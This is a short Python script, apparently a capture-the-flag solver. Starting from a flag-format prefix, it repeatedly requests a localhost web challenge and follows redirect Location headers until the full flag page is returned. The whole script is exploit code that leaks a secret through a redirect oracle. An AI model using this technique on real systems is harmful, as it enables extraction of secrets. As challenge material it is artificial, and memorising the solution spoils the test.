import requests
import os
URL = os.environ.get("URL", "http://localhost:3000/").rstrip("/")

known = "/A/l/p/a/c/a/%7B"

while True:
    r = requests.get(f"{URL}/" + known, allow_redirects=False)
    if r.status_code == 200:
        print(r.text)
        break
    if r.headers["Location"] != "/nope":
        known = r.headers["Location"]
